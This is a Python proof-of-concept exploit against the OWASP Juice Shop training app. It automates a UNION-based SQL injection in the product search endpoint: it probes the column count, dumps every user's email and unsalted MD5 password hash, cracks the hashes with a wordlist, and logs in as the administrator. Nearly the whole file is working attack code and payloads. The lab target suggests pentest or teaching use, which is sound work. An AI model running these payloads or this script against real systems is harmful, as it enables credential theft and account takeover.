#!/usr/bin/env python3
"""
PoC 2 - UNION-based SQL Injection -> database exfiltration
Target: OWASP Juice Shop 20.3.0  (http://host.docker.internal:3000)
Vuln:   GET /rest/products/search?q=<q> concatenates <q> into
            SELECT * FROM Products WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%')) AND deletedAt IS NULL
        The Products query has 10 result columns, so a UNION SELECT of 10 values
        is possible and is rendered straight back into the JSON response.
Impact: Dump the whole Users table (emails + MD5 password hashes) - the hashes
        are unsalted MD5, so they are trivially crackable (admin123 ...).

Usage: python3 poc2_sqli_union_dump.py
"""
import hashlib
import re
import sys

import requests

BASE = "http://host.docker.internal:3000"
ENDPOINT = f"{BASE}/rest/products/search"

# Common password wordlist used to crack the leaked unsalted MD5 hashes
WORDS = ["admin123", "password", "123456", "admin", "juice", "demo", "test",
         "letmein", "secret", "qwerty", "password1", "juiceshop"]


def run(q: str):
    return requests.get(ENDPOINT, params={"q": q}, timeout=15)


def main() -> int:
    print("[*] Step 1: confirm the parameter is injectable")
    r = run("apple'")
    err = re.search(r"SQLITE_ERROR: ([^<]*)", r.text)
    print(f"    q=apple'      -> HTTP {r.status_code}, DB error leaked: {err.group(1).strip() if err else 'none'}")
    r = run("apple'))--")
    ok = r.headers.get("content-type", "").startswith("application/json")
    print(f"    q=apple'))--  -> HTTP {r.status_code}, {len(r.json().get('data', [])) if ok else 0} row(s) returned (injection closed cleanly)")

    print("\n[*] Step 2: find the number of columns in the Products result set")
    cols = None
    for n in range(1, 16):
        probe = "')) UNION SELECT " + ",".join(str(i) for i in range(1, n + 1)) + "--"
        r = run(probe)
        if r.headers.get("content-type", "").startswith("application/json"):
            cols = n
            print(f"    {n} columns -> OK (match)")
            break
        print(f"    {n} columns -> mismatch")
    if not cols:
        print("[-] Could not determine column count")
        return 1

    print("\n[*] Step 3: UNION SELECT the Users table (email in col2, password in col3)")
    payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--"
    r = run(payload)
    rowset = r.json()["data"]

    users = []
    for row in rowset:
        email, pw = str(row.get("name", "")), str(row.get("description", ""))
        if "@" in email and len(pw) == 32:
            users.append((row.get("id"), email, pw))

    if not users:
        print("[-] No user rows recovered")
        return 1

    digest = {hashlib.md5(w.encode()).hexdigest(): w for w in WORDS}

    print(f"    Recovered {len(users)} credential pairs:\n")
    print(f"    {'ID':<4} {'EMAIL':<30} {'MD5 HASH':<34} CRACKED")
    print("    " + "-" * 84)
    cracked = {}
    for uid, email, pw in users:
        plain = digest.get(pw)
        if plain:
            cracked[email] = plain
        print(f"    {uid:<4} {email:<30} {pw:<34} {plain or '-'}")

    print(f"\n[+] VULNERABLE: {len(users)} users dumped, {len(cracked)} hashes cracked "
          f"(unsalted MD5).")

    if "admin@juice-sh.op" in cracked:
        print(f"[+] Admin credentials recovered: admin@juice-sh.op / {cracked['admin@juice-sh.op']}")
        r = requests.post(f"{BASE}/rest/user/login",
                          json={"email": "admin@juice-sh.op",
                                "password": cracked["admin@juice-sh.op"]})
        print(f"    Re-login with cracked password -> HTTP {r.status_code} "
              f"({'admin JWT issued' if r.status_code == 200 else 'failed'})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
